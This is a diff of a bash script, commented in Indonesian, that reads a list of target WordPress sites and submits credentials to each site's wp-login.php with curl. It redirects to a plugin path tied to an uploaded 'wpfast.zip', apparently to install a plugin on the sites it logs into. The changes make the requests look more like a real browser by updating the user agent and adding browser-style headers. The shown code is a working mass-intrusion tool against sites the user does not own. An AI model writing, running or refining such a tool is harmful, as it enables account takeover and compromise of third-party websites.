@@ -7,7 +7,7 @@ login(){
 	rand=$(head /dev/urandom | tr -dc 0-9 | head -c 5 ; echo '')
 
 	# user agent 
-	ua='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0'
+	ua='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0'
 
 	# PLUGIN FILE. KALO GAK NGERTI JANGAN DIRUBAH
 	pluginzip='wpfast.zip'
@@ -19,7 +19,7 @@ login(){
 
 	# curl login dan menyimpan output ke dalam log
 	# timeout diset dengan waktu 2 menit (120 detik) [JANGAN DIGANTI]
-	curl -s --compressed --connect-timeout 120 --cookie-jar log/cookie_${rand}.tmp -X POST "$1/wp-login.php" -L -H "User-Agent: ${ua}" -H "Referer: ${1}/wp-login.php" --data "log=${2}&pwd=${3}&wp-submit=Log In&redirect_to=${pluginpath}" >> log/output_${rand}.tmp
+	curl -s --compressed --connect-timeout 120 --cookie-jar log/cookie_${rand}.tmp -X POST "$1/wp-login.php" -L -H 'User-Agent: '"${ua}"'' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Referer: '"${1}"'/wp-login.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data "log=${2}&pwd=${3}&wp-submit=Log In&redirect_to=${pluginpath}" >> log/output_${rand}.tmp
 
 	# if statment / penyamaan
 	if [[ $(cat log/output_${rand}.tmp) == '' ]]; then
@@ -88,7 +88,7 @@ fi
 printf "[=] List of Target(TXT): "; read TargetList;
 
 if [[ $TargetList == '' ]]; then
-	printf "    [!] $TargetList is a required. Don't leave it blank.\n"
+	printf "    [!] Target List is a required. Don't leave it blank.\n"
 	printf "    [*] List Files: ";ls;
 	printf "[=] List of Target(TXT): "; read TargetList;
 fi
